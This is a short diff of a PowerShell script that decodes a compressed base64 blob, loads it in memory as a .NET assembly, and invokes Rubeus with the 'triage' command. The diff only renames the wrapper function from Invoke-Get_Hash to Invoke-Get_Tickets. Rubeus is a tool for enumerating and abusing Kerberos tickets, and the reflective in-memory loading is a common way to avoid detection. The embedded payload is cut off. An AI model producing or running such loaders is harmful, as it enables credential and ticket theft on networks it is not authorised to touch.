@@ -4,7 +4,7 @@ $a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("H4s
 	$b.CopyTo($c)
 	[byte[]]$d = $c.ToArray()
 	$e = [System.Reflection.Assembly]::Load($d)
-function Invoke-Get_Hash
+function Invoke-Get_Tickets
 {
 	
 	[Rubeus.Program]::Main("triage".Split())
